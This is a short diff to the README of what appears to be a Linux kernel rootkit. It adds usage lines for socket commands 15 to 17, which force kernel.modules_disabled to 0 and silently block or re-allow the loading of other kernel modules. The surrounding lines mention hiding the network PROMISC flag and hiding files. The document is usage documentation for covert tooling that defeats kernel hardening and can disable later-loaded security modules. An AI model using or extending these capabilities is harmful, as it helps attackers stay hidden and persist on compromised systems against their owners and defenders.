@@ -91,7 +91,17 @@ Unhide network PROMISC flag
 
     $ ./sock 14
 
-Note: At the moment, file/dir hiding only hides names in / directory
+Enable module loading (force kernel.modules_disabled=0)
+
+    $ ./sock 15
+
+Silently prohibit module loading (neutralize future loaded modules)
+
+    $ ./sock 16
+
+Silently re-permit module loading (undo command 16)
+
+    $ ./sock 17
 
 
 File/directory hiding
